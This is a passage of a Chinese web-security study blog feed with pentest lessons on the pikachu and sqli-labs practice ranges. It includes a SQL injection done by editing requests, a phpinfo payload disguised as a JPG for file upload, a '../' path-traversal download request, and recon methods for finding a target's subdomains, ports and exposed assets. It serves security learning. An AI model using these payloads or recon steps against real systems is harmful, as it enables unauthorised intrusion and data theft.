spellcheck="true">#数据库名</span></code></pre><h3 id="六、涉及资源："><a href="#六、涉及资源：" class="headerlink" title="六、涉及资源："></a><font size="5"><strong>六、涉及资源：</strong></font></h3><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>忍者安全测试系统-禁用软盘安装<br><a href="https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-011</title>
      <link href="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/"/>
      <url>/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-必懂知识点"><a href="#WEB漏洞-必懂知识点" class="headerlink" title="WEB漏洞-必懂知识点"></a><font size="6"><strong>WEB漏洞-必懂知识点</strong></font></h2><span id="more"></span><h3 id="一、前言知识"><a href="#一、前言知识" class="headerlink" title="一、前言知识"></a><font size="5"><strong>一、前言知识</strong></font></h3><p>前言:本章节将讲解各种WEB层面上的有那些漏洞类型,俱体漏洞的危害等级，以简要的影响范围测试进行实例分析，思维导图中的漏洞也是后面我们将要学习到的各个知识点，其中针对漏洞的形成原理，如何发现，如何利用将是本章节学习的重点内容!<br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/1.png"></p><p>简要知识点</p><pre class=" language-bash"><code class="language-bash">CTE,SRc，红蓝对抗，实战等<span class="token comment" spellcheck="true">#简要说明以上漏洞危害情况</span><span class="token comment" spellcheck="true">#简要说明以上漏洞等级划分</span><span class="token comment" spellcheck="true">#简要说明以上漏洞重点内容</span><span class="token comment" spellcheck="true">#简要说明以上漏洞形势问题</span></code></pre><h3 id="二、pikachu环境搭建"><a href="#二、pikachu环境搭建" class="headerlink" title="二、pikachu环境搭建"></a><font size="5"><strong>二、pikachu环境搭建</strong></font></h3><p>靶场搭建：<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a><br>docker环境</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@oldjiang ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker pull area39/pikachu</span><span class="token punctuation">[</span>root@oldjiang ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker run -d -p8080:80 area39/pikachu</span>72ddd9a05d31fdb921765519c413f3f97dbb34560c9c14d9aa59de73e5d6b3eb</code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/2.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/3.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/4.png"></p><h3 id="三、sql注入之数字注入"><a href="#三、sql注入之数字注入" class="headerlink" title="三、sql注入之数字注入"></a><font size="5"><strong>三、sql注入之数字注入</strong></font></h3><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/5.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/6.png"><br>在数据库中查看信息</p><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from member<span class="token punctuation">;</span>+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> pw                               <span class="token operator">|</span> sex  <span class="token operator">|</span> phonenum    <span class="token operator">|</span> address               <span class="token operator">|</span> email             <span class="token operator">|</span>+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+<span class="token operator">|</span>  1 <span class="token operator">|</span> vince    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 18626545453 <span class="token operator">|</span> chain                 <span class="token operator">|</span> vince@pikachu.com <span class="token operator">|</span><span class="token operator">|</span>  2 <span class="token operator">|</span> allen    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 13676767767 <span class="token operator">|</span> nba 76                <span class="token operator">|</span> allen@pikachu.com <span class="token operator">|</span><span class="token operator">|</span>  3 <span class="token operator">|</span> kobe     <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 15988767673 <span class="token operator">|</span> nba lakes             <span class="token operator">|</span> kobe@pikachu.com  <span class="token operator">|</span><span class="token operator">|</span>  4 <span class="token operator">|</span> grady    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 13676765545 <span class="token operator">|</span> nba hs                <span class="token operator">|</span> grady@pikachu.com <span class="token operator">|</span><span class="token operator">|</span>  5 <span class="token operator">|</span> kevin    <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> boy  <span class="token operator">|</span> 13677676754 <span class="token operator">|</span> Oklahoma City Thunder <span class="token operator">|</span> kevin@pikachu.com <span class="token operator">|</span><span class="token operator">|</span>  6 <span class="token operator">|</span> lucy     <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> girl <span class="token operator">|</span> 12345678922 <span class="token operator">|</span> usa                   <span class="token operator">|</span> lucy@pikachu.com  <span class="token operator">|</span><span class="token operator">|</span>  7 <span class="token operator">|</span> lili     <span class="token operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="token operator">|</span> girl <span class="token operator">|</span> 18656565545 <span class="token operator">|</span> usa                   <span class="token operator">|</span> lili@pikachu.com  <span class="token operator">|</span>+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+</code></pre><p>操作方法<br>● 在文件&#x2F;app&#x2F;vul&#x2F;sqli&#x2F;sqli_id.php第27行下面增加一行 echo $query; 然后保存退出</p><pre class=" language-bash"><code class="language-bash">27 <span class="token variable">$query</span><span class="token operator">=</span><span class="token string">"select username,email from member where id=<span class="token variable">$id</span>"</span><span class="token punctuation">;</span>28  <span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">;</span></code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/7.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/8.png"><br>打开burp修改数据包<br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/9.png"><br>获取到数据库信息<br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/10.png"></p><h3 id="四、文件遍历漏洞"><a href="#四、文件遍历漏洞" class="headerlink" title="四、文件遍历漏洞"></a><font size="5"><strong>四、文件遍历漏洞</strong></font></h3><p>创建文件dir.php</p><pre class=" language-bash"><code class="language-bash">root@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># pwd</span>/approot@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># vim dir.php</span>root@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># pwd</span>/approot@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># cat dir.php</span><span class="token operator">&lt;</span>?php<span class="token keyword">function</span> my_dir<span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span>@<span class="token variable">$handle</span> <span class="token operator">=</span> opendir<span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token keyword">while</span><span class="token variable"><span class="token punctuation">((</span>$file <span class="token operator">=</span> readdir<span class="token punctuation">(</span>$handle<span class="token punctuation">))</span></span> <span class="token operator">!=</span><span class="token operator">=</span> false<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                        if<span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">".."</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span> <span class="token operator">!=</span> <span class="token string">"."</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                                if<span class="token punctuation">(</span>is_dir<span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">.</span> <span class="token string">"/"</span> <span class="token keyword">.</span> <span class="token variable">$file</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123; //如果是子文件夹，进行递归</span>                                        <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token punctuation">]</span> <span class="token operator">=</span> my_dir<span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">.</span> <span class="token string">"/"</span> <span class="token keyword">.</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>                                        <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>                                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>                        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        closedir<span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token keyword">return</span> <span class="token variable">$files</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token keyword">echo</span> <span class="token string">"&lt;pre>"</span><span class="token punctuation">;</span>print_r<span class="token punctuation">(</span>my_dir<span class="token punctuation">(</span><span class="token string">"../app"</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/pre>"</span><span class="token punctuation">;</span>root@eb8d8fc8a3e7:/app<span class="token comment" spellcheck="true"># chmod +x dir.php</span></code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/11.png"><br>备注：目录遍历漏洞一般由其他的漏洞配合才能实现漏洞的作用。</p><h3 id="五、文件上传漏洞"><a href="#五、文件上传漏洞" class="headerlink" title="五、文件上传漏洞"></a><font size="5"><strong>五、文件上传漏洞</strong></font></h3><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/12.png"></p><pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>└─<span class="token comment" spellcheck="true"># cat phpinfo.jpg                                                                                                                                                                     2 ⚙</span><span class="token operator">&lt;</span>?phpphpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/13.png"><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/14.png"><br>注意：文件上传一般是高危漏洞，因为要是上传的是木马文件可以直接拿下服务器。</p><p>五、文件下载漏洞<br>右击复制下载地址：<a href="http://10.1.1.133:8080/vul/unsafedownload/execdownload.php?filename=kb.png">http://10.1.1.133:8080/vul/unsafedownload/execdownload.php?filename=kb.png</a><br><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/15.png"><br>在网站目录中查看</p><pre class=" language-bash"><code class="language-bash">root@eb8d8fc8a3e7:/app/vul/unsafedownload/download<span class="token comment" spellcheck="true"># pwd</span>/app/vul/unsafedownload/downloadroot@eb8d8fc8a3e7:/app/vul/unsafedownload/download<span class="token comment" spellcheck="true"># ls</span>ai.png  bigben.png  camby.png  kb.png  lmx.png  mbl.png  ns.png  oldfish.png  pj.png  rayal.png  sks.png  smallane.png</code></pre><p>修改下载文件</p><pre class=" language-bash"><code class="language-bash">http://10.1.1.133:8080/vul/unsafedownload/execdownload.php?filename<span class="token operator">=</span><span class="token punctuation">..</span>/unsafedownload.php</code></pre><p><img src="/2023/09/24/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-011/16.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-010</title>
      <link href="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/"/>
      <url>/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集-资产监控拓展"><a href="#信息收集-资产监控拓展" class="headerlink" title="信息收集-资产监控拓展"></a><font size="6"><strong>信息收集-资产监控拓展</strong></font></h2><span id="more"></span><p><img src="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/1.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Github监控</span>  便于收集整理最新exp或poc  便于发现相关测试目标的资产<span class="token comment" spellcheck="true"># 各种子域名查询</span><span class="token comment" spellcheck="true"># DNS,备案,证书</span><span class="token comment" spellcheck="true"># 全球节点请求cdn</span>  枚举爆破或解析子域名对应  便于发现管理员相关的注册信息<span class="token comment" spellcheck="true">#黑暗引擎相关搜索</span>    fofa, shodan, zoomeye  <span class="token comment" spellcheck="true">#微信公众号接口获取</span><span class="token comment" spellcheck="true"># 内部群内部资源</span></code></pre><h3 id="一、GitHub项目监控"><a href="#一、GitHub项目监控" class="headerlink" title="一、GitHub项目监控"></a><font size="5"><strong>一、GitHub项目监控</strong></font></h3><p>server酱：<a href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a><br>GitHub项目监控地址：<a href="https://github.com/weixiao9188/wechat_push">https://github.com/weixiao9188/wechat_push</a></p><h4 id="1、监控最新的EXP发布及其他"><a href="#1、监控最新的EXP发布及其他" class="headerlink" title="1、监控最新的EXP发布及其他"></a><font size="4"><strong>1、监控最新的EXP发布及其他</strong></font></h4><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Title: wechat push CVE-2020</span><span class="token comment" spellcheck="true"># Date: 2020-5-9</span><span class="token comment" spellcheck="true"># Exploit Author: weixiao9188</span><span class="token comment" spellcheck="true"># Version: 4.0</span><span class="token comment" spellcheck="true"># Tested on: Linux,windows</span><span class="token comment" spellcheck="true"># coding:UTF-8</span><span class="token function">import</span> requests<span class="token function">import</span> json<span class="token function">import</span> <span class="token function">time</span><span class="token function">import</span> os<span class="token function">import</span> pandas as pdtime_sleep <span class="token operator">=</span> 20 <span class="token comment" spellcheck="true">#每隔20秒爬取一次</span>while<span class="token punctuation">(</span>True<span class="token punctuation">)</span>:    headers <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token string">"User-Agent"</span><span class="token keyword">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400"</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token comment" spellcheck="true">#判断文件是否存在</span>    datas <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    response1<span class="token operator">=</span>None    response2<span class="token operator">=</span>None    <span class="token keyword">if</span> os.path.exists<span class="token punctuation">(</span><span class="token string">"olddata.csv"</span><span class="token punctuation">)</span>:        <span class="token comment" spellcheck="true">#如果文件存在则每次爬取10个</span>        <span class="token function">df</span> <span class="token operator">=</span> pd.read_csv<span class="token punctuation">(</span><span class="token string">"olddata.csv"</span>, header<span class="token operator">=</span>None<span class="token punctuation">)</span>        datas <span class="token operator">=</span> df.where<span class="token punctuation">(</span>df.notnull<span class="token punctuation">(</span><span class="token punctuation">)</span>,None<span class="token punctuation">)</span>.values.tolist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将提取出来的数据中的nan转化为None</span>        response1 <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;per_page=10"</span>,                                 headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        response2 <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;per_page=10"</span>,                                 headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    else:        <span class="token comment" spellcheck="true">#不存在爬取全部</span>        datas <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        response1 <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;order=desc"</span>,headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        response2 <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;order=desc"</span>,headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    data1 <span class="token operator">=</span> json.loads<span class="token punctuation">(</span>response1.text<span class="token punctuation">)</span>    data2 <span class="token operator">=</span> json.loads<span class="token punctuation">(</span>response2.text<span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token punctuation">[</span>data1<span class="token punctuation">[</span><span class="token string">"items"</span><span class="token punctuation">]</span>,data2<span class="token punctuation">[</span><span class="token string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>:        <span class="token keyword">for</span> i <span class="token keyword">in</span> j:            s <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;"name":i['name'],"html":i['html_url'],"description":i['description']&amp;#125;</span>            s1 <span class="token operator">=</span><span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>,i<span class="token punctuation">[</span><span class="token string">'html_url'</span><span class="token punctuation">]</span>,i<span class="token punctuation">[</span><span class="token string">'description'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> s1 not <span class="token keyword">in</span> datas:                <span class="token comment" spellcheck="true">#print(s1)</span>                <span class="token comment" spellcheck="true">#print(datas)</span>                params <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                     <span class="token string">"text"</span>:s<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span>,                    <span class="token string">"desp"</span><span class="token keyword">:</span><span class="token string">" 链接:"</span>+str<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">"html"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>+<span class="token string">"\n简介"</span>+str<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">"description"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>                print<span class="token punctuation">(</span><span class="token string">"当前推送为"</span>+str<span class="token punctuation">(</span>s<span class="token punctuation">)</span>+<span class="token string">"\n"</span><span class="token punctuation">)</span>                print<span class="token punctuation">(</span>params<span class="token punctuation">)</span>                requests.get<span class="token punctuation">(</span><span class="token string">"https://sc.ftqq.com/XXXX.send"</span>,params<span class="token operator">=</span>params,timeout<span class="token operator">=</span>10<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">#time.sleep(1)#以防推送太猛</span>                print<span class="token punctuation">(</span><span class="token string">"推送完成!"</span><span class="token punctuation">)</span>                datas.append<span class="token punctuation">(</span>s1<span class="token punctuation">)</span>            else:                pass                <span class="token comment" spellcheck="true">#print("数据已处在!")</span>    pd.DataFrame<span class="token punctuation">(</span>datas<span class="token punctuation">)</span>.to_csv<span class="token punctuation">(</span><span class="token string">"olddata.csv"</span>,header<span class="token operator">=</span>None,index<span class="token operator">=</span>None<span class="token punctuation">)</span>    time.sleep<span class="token punctuation">(</span>time_sleep<span class="token punctuation">)</span></code></pre><h4 id="常见的子域名收集方法"><a href="#常见的子域名收集方法" class="headerlink" title="常见的子域名收集方法"></a><font size="4"><strong>常见的子域名收集方法</strong></font></h4><p><img src="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/2.png"></p><h3 id="二、黑暗引擎使用"><a href="#二、黑暗引擎使用" class="headerlink" title="二、黑暗引擎使用"></a><font size="5"><strong>二、黑暗引擎使用</strong></font></h3><p>fofa:<a href="https://fofa.so/">https://fofa.so/</a><br><img src="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/3.png"><br>zoomeye:<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br><img src="/2023/09/23/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-010/4.png"></p><h3 id="三、涉及资源："><a href="#三、涉及资源：" class="headerlink" title="三、涉及资源："></a><font size="5"><strong>三、涉及资源：</strong></font></h3><p><a href="https://crt.sh/">https://crt.sh</a><br><a href="https://dnsdb.io/">https://dnsdb.io</a><br><a href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a><br><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br><a href="https://github.com/bit4woo/teemo">https://github.com/bit4woo/teemo</a><br><a href="https://securitytrails.com/domain/www.baidu.com/history/a">https://securitytrails.com/domain/www.baidu.com/history/a</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-009</title>
      <link href="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/"/>
      <url>/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集-APP及其他资产等"><a href="#信息收集-APP及其他资产等" class="headerlink" title="信息收集-APP及其他资产等"></a><font size="6"><strong>信息收集-APP及其他资产等</strong></font></h2><span id="more"></span><h3 id="一、bp抓取手机数据包"><a href="#一、bp抓取手机数据包" class="headerlink" title="一、bp抓取手机数据包"></a><font size="5"><strong>一、bp抓取手机数据包</strong></font></h3><p>手机IP地址：192.168.1.3<br>kali：192.168.1.9</p><p>burp配置<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/1.png"><br>手机配置<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/2.png"><br>抓包测试<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/3.png"><br>配置证书<br>在浏览器中输入192.168.1.9:8888下载证书并重名为ca.cer 然后导入<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/4.png"><br>导入证书：设置-密码与安全-系统安全-加密与凭证-从sd卡安装-然后搜索ca.cer<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/5.png"><br>抓包测试<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/6.png"></p><h3 id="二、对抓取的数据包进行分析"><a href="#二、对抓取的数据包进行分析" class="headerlink" title="二、对抓取的数据包进行分析"></a><font size="5"><strong>二、对抓取的数据包进行分析</strong></font></h3><p>通过对抓取到的数据包进行分析、数据包上面可能有域名有ip地址。对上面的数据包进行信息收集、借助shodan、钟馗之眼、fofa等工具进行端口扫描<br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/7.png"><br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/8.png"><br><img src="/2023/09/22/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-009/9.png"></p><h3 id="三、涉及资源："><a href="#三、涉及资源：" class="headerlink" title="三、涉及资源："></a><font size="5"><strong>三、涉及资源：</strong></font></h3><p><a href="https://fofa.so/">https://fofa.so/</a><br><a href="http://tool.chinaz.com/">http://tool.chinaz.com</a><br><a href="https://www.shodan.io/">https://www.shodan.io/</a><br><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br><a href="https://nmap.org/download.html">https://nmap.org/download.html</a><br><a href="https://securitytrails.com/">https://securitytrails.com/</a> 子域名查询<br><a href="https://pan.baidu.com/s/1P3gW_En1SI7fXzuxvt5uCw">https://pan.baidu.com/s/1P3gW_En1SI7fXzuxvt5uCw</a> 提取码：k5se</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-008</title>
      <link href="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/"/>
      <url>/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集-架构-搭建-WAF等"><a href="#信息收集-架构-搭建-WAF等" class="headerlink" title="信息收集-架构,搭建,WAF等"></a><font size="6"><strong>信息收集-架构,搭建,WAF等</strong></font></h2><span id="more"></span><h3 id="一、前言知识"><a href="#一、前言知识" class="headerlink" title="*一、前言知识"></a><font size="5">*<strong>一、前言知识</strong></font></h3><p>前言：在安全测试中，信息收集是非常重要的一个环节，此环节的信息将影响到后续的成功几率，掌握信息的多少将决定发现漏洞机会大小，换言之决定着是否能完成目标的测试任务。也可以很直接的跟大家说:渗透测试的思路就是从信息收集这里开始，你与大牛的差距也是从这里开始的!<br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/1.png"></p><h3 id="二、站点搭建分析"><a href="#二、站点搭建分析" class="headerlink" title="二、站点搭建分析"></a><font size="5"><strong>二、站点搭建分析</strong></font></h3><h4 id="1、搭建习惯-目录型站点"><a href="#1、搭建习惯-目录型站点" class="headerlink" title="1、搭建习惯-目录型站点"></a><font size="4"><strong>1、搭建习惯-目录型站点</strong></font></h4><pre class=" language-bash"><code class="language-bash">简单的理解就是主站上面存在其他的cms程序例如：    学生网站的上面通过后台扫描探针发现有一个bbs的目录一点击发现是一个bbs的论坛网站如：www.xxx.com/bbs 我们把这个成为目录型网站、可以有两种找到漏洞的思路一个是主站的漏洞另外的一个是bbs上面的漏洞</code></pre><h4 id="2、搭建习惯-端口类站点"><a href="#2、搭建习惯-端口类站点" class="headerlink" title="2、搭建习惯-端口类站点"></a><font size="4"><strong>2、搭建习惯-端口类站点</strong></font></h4><p><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/2.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/3.png"><br>有的站点不是使用的是默认的站点80而是其他的端口、可以使用shodan这种工具去收集端口</p><h4 id="3、搭建习惯-子域名站点"><a href="#3、搭建习惯-子域名站点" class="headerlink" title="3、搭建习惯-子域名站点"></a><font size="4"><strong>3、搭建习惯-子域名站点</strong></font></h4><p><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/4.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/5.png"><br>备注：现在的主流网站都是采用的这种模式且子域名和网站之间很有可能是不在同一台的服务器上面。</p><h4 id="4、搭建习惯-类似域名站点"><a href="#4、搭建习惯-类似域名站点" class="headerlink" title="4、搭建习惯-类似域名站点"></a><font size="4"><strong>4、搭建习惯-类似域名站点</strong></font></h4><p>有些公司由于业务的发展将原来的域名弃用、选择了其他的域名但是我们访问他的旧的域名还是能够访问、有的是二级域名的更换而有的是顶级域名的更换<br>可以通过他的旧的域名找到一些突破口<br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/6.png"><br><img src="/2023/09/21/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-008/7.png"><br>例如：京东的网站是jd.com 那么他就有可能是采用了jd.net jd.cn等域名我们采用社工的方式去尝试获取他的相关域名信息</p><h4 id="5、搭建习惯-旁注-c段站点"><a href="#5、搭建习惯-旁注-c段站点" class="headerlink" title="5、搭建习惯-旁注,c段站点"></a><font 